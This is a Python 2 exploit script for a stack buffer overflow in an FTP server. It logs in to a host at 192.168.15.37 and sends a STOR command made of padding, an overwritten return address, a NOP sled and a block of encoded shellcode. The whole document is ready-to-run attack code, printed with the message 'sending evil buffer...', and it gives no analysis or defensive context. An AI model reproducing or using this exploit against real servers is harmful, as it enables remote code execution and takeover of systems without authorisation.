#!/usr/bin/python

import socket

ret="\x0A\xAF\xD8\x77"
payload=("\xb8\xef\xf7\x87\x8c\xda\xd5\xd9\x74\x24\xf4\x5b\x33\xc9" 
"\xb1\x56\x31\x43\x13\x83\xeb\xfc\x03\x43\xe0\x15\x72\x70" 
"\x16\x50\x7d\x89\xe6\x03\xf7\x6c\xd7\x11\x63\xe4\x45\xa6" 
"\xe7\xa8\x65\x4d\xa5\x58\xfe\x23\x62\x6e\xb7\x8e\x54\x41" 
"\x48\x3f\x59\x0d\x8a\x21\x25\x4c\xde\x81\x14\x9f\x13\xc3" 
"\x51\xc2\xdb\x91\x0a\x88\x49\x06\x3e\xcc\x51\x27\x90\x5a" 
"\xe9\x5f\x95\x9d\x9d\xd5\x94\xcd\x0d\x61\xde\xf5\x26\x2d" 
"\xff\x04\xeb\x2d\xc3\x4f\x80\x86\xb7\x51\x40\xd7\x38\x60" 
"\xac\xb4\x06\x4c\x21\xc4\x4f\x6b\xd9\xb3\xbb\x8f\x64\xc4" 
"\x7f\xed\xb2\x41\x62\x55\x31\xf1\x46\x67\x96\x64\x0c\x6b" 
"\x53\xe2\x4a\x68\x62\x27\xe1\x94\xef\xc6\x26\x1d\xab\xec" 
"\xe2\x45\x68\x8c\xb3\x23\xdf\xb1\xa4\x8c\x80\x17\xae\x3f" 
"\xd5\x2e\xed\x57\x1a\x1d\x0e\xa8\x34\x16\x7d\x9a\x9b\x8c" 
"\xe9\x96\x54\x0b\xed\xd9\x4f\xeb\x61\x24\x6f\x0c\xab\xe3" 
"\x3b\x5c\xc3\xc2\x43\x37\x13\xea\x96\x98\x43\x44\x48\x59" 
"\x34\x24\x38\x31\x5e\xab\x67\x21\x61\x61\x1e\x65\xaf\x51" 
"\x73\x02\xd2\x65\x62\x8e\x5b\x83\xee\x3e\x0a\x1b\x86\xfc" 
"\x69\x94\x31\xfe\x5b\x88\xea\x68\xd3\xc6\x2c\x96\xe4\xcc" 
"\x1f\x3b\x4c\x87\xeb\x57\x49\xb6\xec\x7d\xf9\xb1\xd5\x16" 
"\x73\xac\x94\x87\x84\xe5\x4e\x2b\x16\x62\x8e\x22\x0b\x3d" 
"\xd9\x63\xfd\x34\x8f\x99\xa4\xee\xad\x63\x30\xc8\x75\xb8" 
"\x81\xd7\x74\x4d\xbd\xf3\x66\x8b\x3e\xb8\xd2\x43\x69\x16" 
"\x8c\x25\xc3\xd8\x66\xfc\xb8\xb2\xee\x79\xf3\x04\x68\x86" 
"\xde\xf2\x94\x37\xb7\x42\xab\xf8\x5f\x43\xd4\xe4\xff\xac" 
"\x0f\xad\xf0\xe6\x0d\x84\x98\xae\xc4\x94\xc4\x50\x33\xda" 
"\xf0\xd2\xb1\xa3\x06\xca\xb0\xa6\x43\x4c\x29\xdb\xdc\x39" 
"\x4d\x48\xdc\x6b"
)

buffer='\x41' * 965 +  ret  +  '\x43' *16 + '\x90' * 16   + payload +  '\xCC' * 655



print "sending evil buffer..."
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('192.168.15.37',21))
s.recv(1024)
s.send('USER ftp\r\n')
s.recv(1024)
s.send('PASS ftp\r\n')
s.recv(1024)
s.send( 'STOR ' +  buffer + '\r\n')
s.recv(1024)

s.close()  	
			
			
